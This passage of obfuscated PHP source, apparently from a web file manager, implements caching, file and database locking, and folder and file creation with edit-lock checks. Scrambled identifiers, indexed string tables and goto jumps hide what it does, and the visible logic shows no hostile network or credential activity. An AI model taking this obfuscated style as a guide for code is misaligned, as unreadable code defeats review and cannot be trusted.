break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($İÌÀÈÇÉ†·ß) { if (is_array($İÌÀÈÇÉ†·ß) || is_object($İÌÀÈÇÉ†·ß)) { $İÌÀÈÇÉ†·ß = json_encode($İÌÀÈÇÉ†·ß); } $İÌÀÈÇÉ†·ß = rawurlencode($İÌÀÈÇÉ†·ß); return md5(KOD_SITE_ID . $_SERVER[ÀÆ][71] . $İÌÀÈÇÉ†·ß); } public static function get($ÍĞ£‰ŒØ……Î, $»µ¤ÊˆÎûßŒ = false) { $ êáŒô = self::key($ÍĞ£‰ŒØ……Î); if ($»µ¤ÊˆÎûßŒ) { return unserialize(self::init()->get($ êáŒô)); } if (!isset(self::$memoryCache[$ êáŒô])) { $‡™ = self::init()->get($ êáŒô); self::$memoryCache[$ êáŒô] = unserialize($‡™); } return self::$memoryCache[$ êáŒô]; } public static function set($°‘, $¸¼±º¯§Î, $¤É = false) { $±×Øƒà½ÏÔó = self::key($°‘); if (isset(self::$memoryCache[$±×Øƒà½ÏÔó]) && self::$memoryCache[$±×Øƒà½ÏÔó] === $¸¼±º¯§Î) { return !0; } if ($¤É === 0) { self::$memoryCache[$±×Øƒà½ÏÔó] = $¸¼±º¯§Î; return !0; } CacheLock::lock($°‘); $šƒ = self::init()->set($±×Øƒà½ÏÔó, serialize($¸¼±º¯§Î), $¤É); self::$memoryCache[$±×Øƒà½ÏÔó] = $¸¼±º¯§Î; CacheLock::unlock($°‘); return $šƒ; } public static function getCall($êõ­ÜÎ, $¤¦÷Õ¸ã, $è¹, $“î = array()) { $ÅÍ© =& $_SERVER[ÀÆ]; $ù«ŸøùüÉ…Š¥ = self::get($êõ­ÜÎ); if ($ù«ŸøùüÉ…Š¥ || $ù«ŸøùüÉ…Š¥ === $ÅÍ©[33]) { return $ù«ŸøùüÉ…Š¥; } $ù«ŸøùüÉ…Š¥ = call_user_func_array($è¹, $“î); $ù«ŸøùüÉ…Š¥ = $ù«ŸøùüÉ…Š¥ ? $ù«ŸøùüÉ…Š¥ : $ÅÍ©[33]; self::set($êõ­ÜÎ, $ù«ŸøùüÉ…Š¥, $¤¦÷Õ¸ã); return $ù«ŸøùüÉ…Š¥; } public static function remove($¸øà­¼»ŠÙà) { $»¬á = self::key($¸øà­¼»ŠÙà); unset(self::$memoryCache[$»¬á]); self::clearTimeout(); CacheLock::lock($¸øà­¼»ŠÙà); $€®®Ú¡ÃÏ = self::init()->remove($»¬á); CacheLock::unlock($¸øà­¼»ŠÙà); return $€®®Ú¡ÃÏ; } public static function removeMemory($¿£ğ) { $ê·ß±®Ñ = self::key($¿£ğ); unset(self::$memoryCache[$ê·ß±®Ñ]); } public static function clearMemory($Å ˆ®é³µ± = false) { if ($Å ˆ®é³µ±) { $Å ˆ®é³µ± = self::key($Å ˆ®é³µ±); unset(self::$memoryCache[$Å ˆ®é³µ±]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÀÆ][824])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÀÆ][825])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($, $»¥ÒŠç‹±áÀ) { $ÄÔÛ‚ë’ =& $_SERVER[ÀÆ]; $this->cachePath = $[$ÄÔÛ‚ë’[76]]; $this->prefix = $ÄÔÛ‚ë’[826]; $this->cacheTime = $»¥ÒŠç‹±áÀ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($îÏ±ñ­•×) { $‡æã¸À’Ä =& $_SERVER[ÀÆ]; $îÏ±ñ­•× = str_replace(array($‡æã¸À’Ä[827], $‡æã¸À’Ä[97], $‡æã¸À’Ä[70]), $‡æã¸À’Ä[828], $îÏ±ñ­•×); return $this->cachePath . $‡æã¸À’Ä[829] . $îÏ±ñ­•× . $‡æã¸À’Ä[830]; } public function set($«û, $õæŸù, $Ï = false) { $‡£ïÒ…Ë‚ = $this->getFile($«û); if (file_put_contents($‡£ïÒ…Ë‚, $this->prefix . $õæŸù, LOCK_EX)) { @touch($‡£ïÒ…Ë‚, intval(time() + $Ï)); clearstatcache(); return !0; } @unlink($‡£ïÒ…Ë‚); return !1; } public function get($‘‚Ñç„É) { $Æ™œˆ£÷ï÷Š = $this->getFile($‘‚Ñç„É); if (file_exists($Æ™œˆ£÷ï÷Š) && filemtime($Æ™œˆ£÷ï÷Š) < time()) { @unlink($Æ™œˆ£÷ï÷Š); return !1; } $ğ±Şé = @file_get_contents($Æ™œˆ£÷ï÷Š); return substr($ğ±Şé, strlen($this->prefix)); } public function remove($ïŞ²—èñ£É) { $ıÁ‚ = $this->getFile($ïŞ²—èñ£É); return @unlink($ıÁ‚); } public function deleteAll() { $°¶ =& $_SERVER[ÀÆ]; $»Å» = scandir($this->cachePath); foreach ($»Å» as $¨É) { $èôŒ¸ = $this->cachePath . $¨É; if (strpos($èôŒ¸, $°¶[830]) && strpos($èôŒ¸, $°¶[831])) { @unlink($èôŒ¸); } } } public function clearTimeout() { $Á¨ =& $_SERVER[ÀÆ]; $®Ö›×á = scandir($this->cachePath); foreach ($®Ö›×á as $õáÃÕÎÎ˜¹‹ë) { $ì¼ = $this->cachePath . $õáÃÕÎÎ˜¹‹ë; if (strpos($ì¼, $Á¨[830]) && strpos($ì¼, $Á¨[831]) && filemtime($ì¼) < time()) { @unlink($ì¼); } } } } goto dø½Ìš; dø½Ìš: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Æåö =& $_SERVER[ÀÆ]; if (self::$handle) { return self::$handle; } $Øµã¸ = $GLOBALS[$Æåö[6]][$Æåö[347]]; self::$timeout = $Øµã¸[$Æåö[832]] ? $Øµã¸[$Æåö[832]] : 10; $éÈî€‰­ø = _get($GLOBALS[$Æåö[6]], $Æåö[833]); $Ì’¾İ©èÏ = $Øµã¸[$Æåö[819]] ? $Øµã¸[$Æåö[819]] : $Æåö[193]; if ($Ì’¾İ©èÏ == $Æåö[17] && $éÈî€‰­ø == $Æåö[9]) { $Ì’¾İ©èÏ = $Æåö[193]; } switch ($Ì’¾İ©èÏ) { case $Æåö[822]: self::$handle = new CacheLockRedis(); break; case $Æåö[823]: self::$handle = new CacheLockMemcached(); break; case $Æåö[17]: self::$handle = new CacheLockDatabase(); break; case $Æåö[193]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Æåö[834] . REQUEST_ID . $Æåö[835], $Æåö[836]); } return self::$handle; } private static function key($¹İ¯–Â¯¸) { return $_SERVER[ÀÆ][837] . Cache::key($¹İ¯–Â¯¸); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÃŒ©ÆÓ½È = '') { self::$errorMsg = $ÃŒ©ÆÓ½È; } public static function lockGlobal($òæüÚĞÓ¿¨ê, $§¾Šıİ‚„¿) { return self::lock($òæüÚĞÓ¿¨ê, $§¾Šıİ‚„¿, !0); } public static function lock($óÅš, $•ÂŸö©íÅ = false, $ŸÔú = false) { $«Íã¥ß =& $_SERVER[ÀÆ]; $°Õåç÷»¥ = self::init(); $÷Áù¨±« = self::key($óÅš); $•ÂŸö©íÅ = $•ÂŸö©íÅ ? $•ÂŸö©íÅ : self::$timeout; $£ï›¢¨ƒº³ = $°Õåç÷»¥->lock($÷Áù¨±«, $•ÂŸö©íÅ); $Û‹õ·ö = timeFloat(); if (!$£ï›¢¨ƒº³) { $¤±¢¬çŠ = "\154\157\x63\153\40\x65\162\x72\157\162\x3b\153\145\x79\75{$óÅš}\x3b\164\x69\x6d\x65\75{$•ÂŸö©íÅ}\73" . self::$errorMsg . $«Íã¥ß[68] . get_caller_msg(); $õà = LNG($«Íã¥ß[838]) . "\x28{$•ÂŸö©íÅ}\163\51\x2e" . LNG($«Íã¥ß[839]); $õà .= $«Íã¥ß[840]; if (is_string(self::$errorMsg) && self::$errorMsg) { $õà = $õà . $«Íã¥ß[841] . self::$errorMsg; } write_log($¤±¢¬çŠ, $«Íã¥ß[836]); show_json($õà, !1); } if (!$ŸÔú) { self::$lockItem[$÷Áù¨±«] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ô« = number_format(timeFloat() - $Û‹õ·ö, 3); write_log($«Íã¥ß[834] . REQUEST_ID . $«Íã¥ß[4] . $óÅš . $«Íã¥ß[842] . $Ô«, $«Íã¥ß[836]); } return $£ï›¢¨ƒº³; } public static function lockGet($Öç–ÇÛ·Ä›¨) { $‘ŠÉ¡Ç¢ = self::key($Öç–ÇÛ·Ä›¨); if (self::$lockItem[$‘ŠÉ¡Ç¢]) { return self::$lockItem[$‘ŠÉ¡Ç¢]; } return self::init()->lockGet($‘ŠÉ¡Ç¢); } public static function unlock($ÌÓï) { $—ó¾ÙÌ“Ä­šª =& $_SERVER[ÀÆ]; $îÒ¾“î = self::key($ÌÓï); self::$lockItem[$îÒ¾“î] = null; self::init()->unlock($îÒ¾“î); if (GLOBAL_DEBUG_LOG_ALL) { write_log($—ó¾ÙÌ“Ä­šª[843] . REQUEST_ID . $—ó¾ÙÌ“Ä­šª[4] . $ÌÓï, $—ó¾ÙÌ“Ä­šª[836]); } return; } public static function unlockRuntime() { $ï×ËÖ­¬­‹ =& $_SERVER[ÀÆ]; $Óø¯ = self::init(); $—§†Îˆ»¸ = !1; foreach (self::$lockItem as $ıÆ¬ => $èÆ´üô…”) { if (!$èÆ´üô…”) { continue; } $Óø¯->unlock($ıÆ¬); if (!$—§†Îˆ»¸) { $—§†Îˆ»¸ = !0; write_log($ï×ËÖ­¬­‹[844] . $ıÆ¬ . $ï×ËÖ­¬­‹[68] . get_caller_msg(), $ï×ËÖ­¬­‹[836]); continue; } write_log($ï×ËÖ­¬­‹[844] . $ıÆ¬, $ï×ËÖ­¬­‹[836]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $å° ¼ıÎîñ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ï×ËÖ­¬­‹[834] . REQUEST_ID . $ï×ËÖ­¬­‹[845] . $å° ¼ıÎîñ . $ï×ËÖ­¬­‹[846] . ACTION, $ï×ËÖ­¬­‹[836]); } } public static function fileLock($ì›) { $ª©¬çîÉ =& $_SERVER[ÀÆ]; if (!$GLOBALS[$ª©¬çîÉ[847]]) { $GLOBALS[$ª©¬çîÉ[847]] = array(); } $GLOBALS[$ª©¬çîÉ[847]][$ì›] = !1; $„ÊÉ = fopen(DATA_PATH . $ì› . $ª©¬çîÉ[848], $ª©¬çîÉ[849]); if (!$„ÊÉ) { return !1; } $GLOBALS[$ª©¬çîÉ[847]][$ì›] = $„ÊÉ; if (flock($„ÊÉ, LOCK_EX)) { return !0; } self::unlock($ì›); show_json($ª©¬çîÉ[850], !1); return !1; } public static function fileUnlock($™ù«„øË¨) { $‹»½‹à¬¶È’ì =& $_SERVER[ÀÆ]; $š¬º”®şÃü”€ = $GLOBALS[$‹»½‹à¬¶È’ì[847]][$™ù«„øË¨]; if (!$š¬º”®şÃü”€) { return; } $GLOBALS[$‹»½‹à¬¶È’ì[847]][$™ù«„øË¨] = !1; flock($š¬º”®şÃü”€, LOCK_UN); fclose($š¬º”®şÃü”€); } public static function fileUnlockAll() { $ı•‡ºé­® =& $_SERVER[ÀÆ]; if (!$GLOBALS[$ı•‡ºé­®[847]]) { return; } foreach ($GLOBALS[$ı•‡ºé­®[847]] as $ë‘ => $ÌÆ×¿) { if (!$ÌÆ×¿) { continue; } $GLOBALS[$ı•‡ºé­®[847]][$ë‘] = !1; flock($ÌÆ×¿, LOCK_UN); fclose($ÌÆ×¿); } $GLOBALS[$ı•‡ºé­®[847]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $şª¸…«åãÅÂ =& $_SERVER[ÀÆ]; $ÕŞ = $GLOBALS[$şª¸…«åãÅÂ[6]][$şª¸…«åãÅÂ[347]]; self::$cachePath = $ÕŞ[$şª¸…«åãÅÂ[193]][$şª¸…«åãÅÂ[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($•ñ÷, $‹³ = 0) { $ˆÂ =& $_SERVER[ÀÆ]; $ï ÌÁ = microtime(!0); $úáº¶Ô± = $ï ÌÁ + $‹³ + 0.0001; $®úî™í¿ñá™ = rtrim(self::$cachePath, $ˆÂ[8]) . $ˆÂ[851] . md5($•ñ÷) . $ˆÂ[848]; if (file_exists($®úî™í¿ñá™) && filemtime($®úî™í¿ñá™) && filemtime($®úî™í¿ñá™) < time() - 10) { @unlink($®úî™í¿ñá™); } do { if (file_exists($®úî™í¿ñá™)) { cacheLockWait(); continue; } $ğÒÕ¤ˆ = fopen($®úî™í¿ñá™, $ˆÂ[852]); if (!$ğÒÕ¤ˆ) { return !1; } $ÜÂŠıëÊóÇ¼ = flock($ğÒÕ¤ˆ, LOCK_EX | LOCK_NB); self::$caches[$•ñ÷] = array($ˆÂ[853] => $ğÒÕ¤ˆ, $ˆÂ[193] => $®úî™í¿ñá™); fwrite($ğÒÕ¤ˆ, $úáº¶Ô±); clearstatcache(); if ($ğÒÕ¤ˆ && $ÜÂŠıëÊóÇ¼) { return !0; } cacheLockWait(); } while (microtime(!0) < $úáº¶Ô±); $this->unlock($•ñ÷); return !1; } public function lockGet($«ù´ò†ğ) { $…œÏûÚ£åÙ =& $_SERVER[ÀÆ]; $ÇÉç¦ = rtrim(self::$cachePath, $…œÏûÚ£åÙ[8]) . $…œÏûÚ£åÙ[851] . md5($«ù´ò†ğ) . $…œÏûÚ£åÙ[848]; return file_exists($ÇÉç¦); } public function unlock($ÄÌÂãÉ) { $ë¶Ü”ı°À =& $_SERVER[ÀÆ]; $Ø–Ä³øŒ‰ = self::$caches[$ÄÌÂãÉ]; if (!$Ø–Ä³øŒ‰) { return; } @flock($Ø–Ä³øŒ‰[$ë¶Ü”ı°À[853]], LOCK_UN); @fclose($Ø–Ä³øŒ‰[$ë¶Ü”ı°À[853]]); @unlink($Ø–Ä³øŒ‰[$ë¶Ü”ı°À[193]]); unset(self::$caches[$ÄÌÂãÉ]); } } goto dæÀé¸¤£³; EÀ¨¢àµ‡È: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¸Ç–À) { $£ò =& $_SERVER[ÀÆ]; $­ßÄŒñí = Model($£ò[507])->where(array($£ò[1563] => $¸Ç–À))->find(); $ÚÒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¸Ç–À, $­ßÄŒñí[$£ò[28]]); $this->userDesktopAdd($ÚÒ); return $ÚÒ; } public function userDesktopAdd($¤ùìûª·îÁİé) { $ğ×Ó =& $_SERVER[ÀÆ]; $øñŠ = LNG($ğ×Ó[2002]); $òÄ†©´Ë°È = $this->mkdir($¤ùìûª·îÁİé, $øñŠ); $this->metaSet($òÄ†©´Ë°È, $ğ×Ó[2003], $ğ×Ó[87]); $this->metaSet($¤ùìûª·îÁİé, $ğ×Ó[2004], $òÄ†©´Ë°È); } public function groupRootAdd($×˜“) { $Ø­¿Ó =& $_SERVER[ÀÆ]; $¡„áäßÑ¿Ş¬ = Model($Ø­¿Ó[516])->where(array($Ø­¿Ó[1826] => $×˜“))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $×˜“, $¡„áäßÑ¿Ş¬[$Ø­¿Ó[28]]); } public function systemRootPathAdd($´ë¬ë) { if ($´ë¬ë != $_SERVER[ÀÆ][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $´ë¬ë); } public function userRootRemove($Ô÷¤¸) { $–è™ªÃ = $this->sourceRoot(SourceModel::TYPE_USER, $Ô÷¤¸); if (!$–è™ªÃ) { return; } $this->remove($–è™ªÃ, !1); } public function groupRootRemove($–¸íí–öœú—ê) { $ØğÉÏê¬ï = $this->sourceRoot(SourceModel::TYPE_GROUP, $–¸íí–öœú—ê); if (!$ØğÉÏê¬ï) { return; } $this->remove($ØğÉÏê¬ï, !1); } private function _mkdirRoot($Õ , $ğ›­Íè’œ, $§ç¶À¨ˆâ‰§é) { $Ÿ¦¾Ë¤¢£ =& $_SERVER[ÀÆ]; $÷±ã¦Ë‹ğæ = array($Ÿ¦¾Ë¤¢£[396] => 0, $Ÿ¦¾Ë¤¢£[574] => $Õ , $Ÿ¦¾Ë¤¢£[575] => $ğ›­Íè’œ, $Ÿ¦¾Ë¤¢£[571] => 1, $Ÿ¦¾Ë¤¢£[576] => USER_ID, $Ÿ¦¾Ë¤¢£[577] => USER_ID, $Ÿ¦¾Ë¤¢£[572] => $Ÿ¦¾Ë¤¢£[33], $Ÿ¦¾Ë¤¢£[578] => $Ÿ¦¾Ë¤¢£[525], $Ÿ¦¾Ë¤¢£[424] => 0, $Ÿ¦¾Ë¤¢£[573] => 0, $Ÿ¦¾Ë¤¢£[462] => 0, $Ÿ¦¾Ë¤¢£[579] => $Ÿ¦¾Ë¤¢£[33]); if ($à—¸¸› = $this->where($÷±ã¦Ë‹ğæ)->find()) { return $à—¸¸›[$Ÿ¦¾Ë¤¢£[397]]; } $Ö©š¤ = "\x4d\157\144\x65\x6c\x53\157\x75\x72\x63\x65\x2e\x6d\x6b\x64\x69\162\x52\157\157\164\x2e{$Õ }\x2e{$ğ›­Íè’œ}\56" . $§ç¶À¨ˆâ‰§é; CacheLock::lock($Ö©š¤); $÷±ã¦Ë‹ğæ[$Ÿ¦¾Ë¤¢£[28]] = $§ç¶À¨ˆâ‰§é; $á¨Ÿ = $this->add($÷±ã¦Ë‹ğæ); $ÜÉÔ = array($Ÿ¦¾Ë¤¢£[580] => short_id($á¨Ÿ)); $this->where(array($Ÿ¦¾Ë¤¢£[412] => $á¨Ÿ))->save($ÜÉÔ); CacheLock::unlock($Ö©š¤); return $á¨Ÿ; } private function sourceRoot($ ŞÏÑ¸“İÚ½ô, $ê¯µ†…µ–·È, $±ô˜†®íÙ = false) { $ô =& $_SERVER[ÀÆ]; $ø˜ÎêÅÆ = array($ô[396] => 0, $ô[574] => $ ŞÏÑ¸“İÚ½ô, $ô[575] => $ê¯µ†…µ–·È); if ($‹Öº£Û˜Óôİ = $this->where($ø˜ÎêÅÆ)->find()) { return $±ô˜†®íÙ ? $‹Öº£Û˜Óôİ : $‹Öº£Û˜Óôİ[$ô[397]]; } return !1; } public function sourceRootGroup($½§¦) { $¾­Î =& $_SERVER[ÀÆ]; if (is_string($½§¦)) { $½§¦ = array($½§¦); } $şöÌ§ = array($¾­Î[396] => 0, $¾­Î[575] => array($¾­Î[7], $½§¦), $¾­Î[574] => SourceModel::TYPE_GROUP); $this->selectPageReset(); $Ü“Æô½¿ ¯ğ = $this->limit(count($½§¦))->listSource($şöÌ§, 1000); $this->selectPageRestore(); return array_to_keyvalue($Ü“Æô½¿ ¯ğ[$¾­Î[75]], $¾­Î[498]); } public function mkfile($„ß¿Úş’, $œÃè–¹Ò¡, $çç = '', $©–ÕéÜÈÁ = REPEAT_RENAME) { $×äãÒ =& $_SERVER[ÀÆ]; $£‹ = Model($×äãÒ[597])->addFileByContent($çç, $œÃè–¹Ò¡); return $this->_createFileCall($„ß¿Úş’, $œÃè–¹Ò¡, $£‹, $©–ÕéÜÈÁ, $×äãÒ[1260]); } public function addFile($¾ö®İĞÙ†ã¨, $Ÿİ³§Î€ë²ü, $—, $ç‹ïßÊ§ = false, $âé¡ı  = REPEAT_RENAME) { $‹çõ´ì = Model($_SERVER[ÀÆ][597])->addFile($Ÿİ³§Î€ë²ü, $—, $ç‹ïßÊ§); return $this->_createFileCall($¾ö®İĞÙ†ã¨, $—, $‹çõ´ì, $âé¡ı ); } public function addFileByFileID($êùÉÔıË, $ü², $úÅØ², $ôîª¹–­¼š× = REPEAT_RENAME) { $ª÷Ã‚óú½ =& $_SERVER[ÀÆ]; $Õ = Model($ª÷Ã‚óú½[597])->find($ü²); Model($ª÷Ã‚óú½[597])->linkAdd($ü²); return $this->_createFileCall($êùÉÔıË, $úÅØ², $Õ, $ôîª¹–­¼š×); } public function addFileByRemote($Ş¾ã‹Ó‡ç, $™Ò‹‚, $öß, $Ô›» = array(), $Èøğ„¼ = REPEAT_RENAME) { $Ù…” = Model($_SERVER[ÀÆ][597])->addFileByRemote($™Ò‹‚, $öß, $Ô›»); return $this->_createFileCall($Ş¾ã‹Ó‡ç, $öß, $Ù…”, $Èøğ„¼); } private function _createFileCall($°£Øİú€×, $€ïÛÚâÇ, $¼ñõƒŒ¥–¿, $†“á°, $©ÀÇ = "\x75\160\x6c\x6f\x61\144") { $²”¯ûõóñ½ =& $_SERVER[ÀÆ]; $©¶»´Ñ— = !1; $this->setMasterDB(); $this->lockWriteStart($°£Øİú€×, $€ïÛÚâÇ); $é±­ä×½§© = $this->fileNameExist($°£Øİú€×, $€ïÛÚâÇ); $‡¤‡ğ’œ¬—ö = $this->_createFile($°£Øİú€×, $€ïÛÚâÇ, $¼ñõƒŒ¥–¿, $†“á°, $©¶»´Ñ—); if (!$©¶»´Ñ—) { Model($²”¯ûõóñ½[464])->remove($¼ñõƒŒ¥–¿[$²”¯ûõóñ½[461]]); } if ($©¶»´Ñ— && $‡¤‡ğ’œ¬—ö && $‡¤‡ğ’œ¬—ö != $é±­ä×½§©) { Model($²”¯ûõóñ½[1975])->eventCreate($‡¤‡ğ’œ¬—ö, $©ÀÇ); } $this->lockWriteEnd($°£Øİú€×, $€ïÛÚâÇ); return $‡¤‡ğ’œ¬—ö; } public function mkdir($½Å, $©ºüíãíŞ­Æ, $³Ì²ïˆ  = REPEAT_SKIP) { $Ì›ë£˜ö¥±… =& $_SERVER[ÀÆ]; $this->setMasterDB(); $‚‹ş±û§ûİÙ¾ = $this->sourceInfo($½Å); if (!$‚‹ş±û§ûİÙ¾) { return !1; } $this->lockWriteStart($½Å, $©ºüíãíŞ­Æ); if ($³Ì²ïˆ  !== !1) { $¨Ã = $this->fileNameExist($½Å, $©ºüíãíŞ­Æ); if ($¨Ã && $³Ì²ïˆ  != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($½Å, $©ºüíãíŞ­Æ); return $¨Ã; } $©ºüíãíŞ­Æ = $this->fileNameAuto($½Å, $©ºüíãíŞ­Æ, $³Ì²ïˆ ); } $§ã = array($Ì›ë£˜ö¥±…[571] => 1, $Ì›ë£˜ö¥±…[415] => $©ºüíãíŞ­Æ, $Ì›ë£˜ö¥±…[572] => $Ì›ë£˜ö¥±…[33], $Ì›ë£˜ö¥±…[462] => 0, $Ì›ë£˜ö¥±…[573] => 0); $€Àƒ = $this->_addSource($§ã, $‚‹ş±û§ûİÙ¾); Model($Ì›ë£˜ö¥±…[1975])->eventCreate($€Àƒ, $Ì›ë£˜ö¥±…[1261]); $this->lockWriteEnd($½Å, $©ºüíãíŞ­Æ); return $€Àƒ; } private function _createFile($¬œƒ­ï‹­–¸, $•’, $„¦î†Ê, $Âö, &$®¡Ù) { $í¿¨İöÈ =& $_SERVER[ÀÆ]; $±¤€¶´ûƒâÎ” = $this->sourceInfo($¬œƒ­ï‹­–¸); if (!$„¦î†Ê || !$±¤€¶´ûƒâÎ”) { return !1; } if ($Âö !== !1) { $Ğ©Ò×£”Å¬¹’ = $this->fileNameExist($¬œƒ­ï‹­–¸, $•’); } $®¡Ù = !0; if ($Âö && $Ğ©Ò×£”Å¬¹’) { if ($Âö == REPEAT_SKIP) { $®¡Ù = !1; return $Ğ©Ò×£”Å¬¹’; } else { if ($Âö == REPEAT_REPLACE) { $ÄËİ£Â“ñ = $this->sourceInfo($Ğ©Ò×£”Å¬¹’); $É¿’ = $this->fileHistory($ÄËİ£Â“ñ, $„¦î†Ê[$í¿¨İöÈ[461]], $„¦î†Ê[$í¿¨İöÈ[78]]); if (!$É¿’) { $®¡Ù = !1; } else { $this->folderSizeReset($¬œƒ­ï‹­–¸); } return $Ğ©Ò×£”Å¬¹’; } else { $•’ = $this->fileNameAuto($¬œƒ­ï‹­–¸, $•’, $Âö, !1); } } } $ş±îéÓ„¨îÃ = array($í¿¨İöÈ[571] => 0, $í¿¨İöÈ[415] => $•’, $í¿¨İöÈ[572] => substr(get_path_ext($•’), 0, 10), $í¿¨İöÈ[462] => $„¦î†Ê[$í¿¨İöÈ[461]], $í¿¨İöÈ[573] => $„¦î†Ê[$í¿¨İöÈ[78]]); $¾ĞÊùûŸ÷©÷ = $this->_addSource($ş±îéÓ„¨îÃ, $±¤€¶´ûƒâÎ”); $this->folderSizeReset($¬œƒ­ï‹­–¸, intval($ş±îéÓ„¨îÃ[$í¿¨İöÈ[78]])); return $¾ĞÊùûŸ÷©÷; } protected function fileHistory($ß¯, $³è, $§İ¦°Ó­°ÀÍ™) { $Ô†°ƒø™÷Ñ‹ =& $_SERVER[ÀÆ]; $¿‚Äšè = defined($Ô†°ƒø™÷Ñ‹[468]) ? USER_ID : $Ô†°ƒø™÷Ñ‹[191]; if ($ß¯[$Ô†°ƒø™÷Ñ‹[461]] == $³è) { return !1; } $this->checkLock($ß¯[$Ô†°ƒø™÷Ñ‹[397]], $³è); Model($Ô†°ƒø™÷Ñ‹[2005])->addHistory($ß¯); $ªÃ¸€Ãß° = array($Ô†°ƒø™÷Ñ‹[577] => $¿‚Äšè, $Ô†°ƒø™÷Ñ‹[419] => time(), $Ô†°ƒø™÷Ñ‹[461] => $³è, $Ô†°ƒø™÷Ñ‹[78] => $§İ¦°Ó­°ÀÍ™); $this->where(array($Ô†°ƒø™÷Ñ‹[412] => $ß¯[$Ô†°ƒø™÷Ñ‹[397]]))->save($ªÃ¸€Ãß°); $this->sourceCacheClear($ß¯[$Ô†°ƒø™÷Ñ‹[397]]); return !0; } public function checkLock($§œùÅÈ’‚ÁÑ—, $«ÖÃ) { $íÏ¡ñú¨ =& $_SERVER[ÀÆ]; $»©¨Ô è‰Å = $this->pathInfo($§œùÅÈ’‚ÁÑ—); if (!$this->fileIsLock($»©¨Ô è‰Å, !0)) { return; } $òØ = Session::get($íÏ¡ñú¨[2006]); $Âüí¨Àò”Ñ = substr($»©¨Ô è‰Å[$íÏ¡ñú¨[28]], 0, -1 - strlen($»©¨Ô è‰Å[$íÏ¡ñú¨[168]])) . $íÏ¡ñú¨[1524] . $òØ . $íÏ¡ñú¨[95] . $»©¨Ô è‰Å[$íÏ¡ñú¨[168]]; $ñë‹¡Ååá = Model($íÏ¡ñú¨[597])->find($«ÖÃ); $this->_createFileCall($»©¨Ô è‰Å[$íÏ¡ñú¨[492]], $Âüí¨Àò”Ñ, $ñë‹¡Ååá, REPEAT_REPLACE, $íÏ¡ñú¨[1260]); $õáó = $»©¨Ô è‰Å[$íÏ¡ñú¨[459]][$íÏ¡ñú¨[536]]; $ò¬ = $õáó[$íÏ¡ñú¨[2007]] ? $õáó[$íÏ¡ñú¨[2007]] : $õáó[$íÏ¡ñú¨[28]]; show_json(LNG($íÏ¡ñú¨[2008]) . $íÏ¡ñú¨[2009] . LNG($íÏ¡ñú¨[2010]) . $íÏ¡ñú¨[2011] . $ò¬ . $íÏ¡ñú¨[2012], !1); } public function fileIsLock($¢ğÓÈ„, $ï¶ˆ = false) { $‡Ê¯ô¼‚Ó =& $_SERVER[ÀÆ]; if (!isset($¢ğÓÈ„[$‡Ê¯ô¼‚Ó[459]]) || !$¢ğÓÈ„[$‡Ê¯ô¼‚Ó[459]][$‡Ê¯ô¼‚Ó[533]]) { return !1; } if ($¢ğÓÈ„[$‡Ê¯ô¼‚Ó[459]][$‡Ê¯ô¼‚Ó[533]] != USER_ID) { return !0; } $¢íšõ = $GLOBALS[$‡Ê¯ô¼‚Ó[6]][$‡Ê¯ô¼‚Ó[88]][$‡Ê¯ô¼‚Ó[534]]; if ($¢ğÓÈ„[$‡Ê¯ô¼‚Ó[459]][$‡Ê¯ô¼‚Ó[535]] <= time() - $¢íšõ) { $this->metaSet($¢ğÓÈ„[$‡Ê¯ô¼‚Ó[397]], $‡Ê¯ô¼‚Ó[533], null); $this->metaSet($¢ğÓÈ„[$‡Ê¯ô¼‚Ó[397]], $‡Ê¯ô¼‚Ó[535], null); } if ($ï¶ˆ) { $this->metaSet($¢ğÓÈ„[$‡Ê¯ô¼‚Ó[397]], $‡Ê¯ô¼‚Ó[535], time()); } return !1; } private function _addSource($À¹, $ú»˜Œ) { $ò×ê¤‹Ğ© =& $_SERVER[ÀÆ]; $Æ¦á™áíà¹ = defined($ò×ê¤‹Ğ©[468]) ? USER_ID : $ò×ê¤‹Ğ©[191]; $‰¯œÅ• = array($ò×ê¤‹Ğ©[574] => $ú»˜Œ[$ò×ê¤‹Ğ©[406]], $ò×ê¤‹Ğ©[575] => $ú»˜Œ[$ò×ê¤‹Ğ©[498]], $ò×ê¤‹Ğ©[576] => $Æ¦á™áíà¹, $ò×ê¤‹Ğ©[577] => $Æ¦á™áíà¹, $ò×ê¤‹Ğ©[396] => $ú»˜Œ[$ò×ê¤‹Ğ©[397]], $ò×ê¤‹Ğ©[578] => $ú»˜Œ[$ò×ê¤‹Ğ©[515]] . $ú»˜Œ[$ò×ê¤‹Ğ©[397]] . $ò×ê¤‹Ğ©[47], $ò×ê¤‹Ğ©[424] => 0, $ò×ê¤‹Ğ©[579] => $ò×ê¤‹Ğ©[33]); $À¹ = array_merge($‰¯œÅ•, $À¹); $this->updateModifyTime($À¹[$ò×ê¤‹Ğ©[492]]); $µÂÉ = $ò×ê¤‹Ğ©[2013] . $ú»˜Œ[$ò×ê¤‹Ğ©[397]]; if (isset(self::$cacheChildList[$µÂÉ])) { unset(self::$cacheChildList[$µÂÉ]); } static $÷´ = false; if (!$÷´) { 